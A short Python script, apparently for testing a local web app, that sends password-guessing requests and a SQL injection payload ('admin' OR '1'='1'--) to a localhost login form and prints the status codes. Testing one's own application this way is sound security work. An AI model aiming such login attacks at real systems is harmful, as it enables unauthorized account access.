import requests

TARGET_URL = "http://localhost:5000/login"  # Change if using a different port or host

def brute_force_attack():
    print("Starting brute-force attack simulation...")
    passwords = ["password", "123456", "admin", "letmein"]
    for pwd in passwords:
        response = requests.post(TARGET_URL, data={
            "email": "attacker@example.com",
            "password": pwd
        })
        print(f"Tried password '{pwd}': Status code {response.status_code}")

def sql_injection_attack():
    print("Starting SQL Injection attack simulation...")
    payload = "admin' OR '1'='1'--"
    response = requests.post(TARGET_URL, data={
        "email": payload,
        "password": "anything"
    })
    print(f"SQL Injection attempt: Status code {response.status_code}")

if __name__ == "__main__":
    brute_force_attack()
    sql_injection_attack()

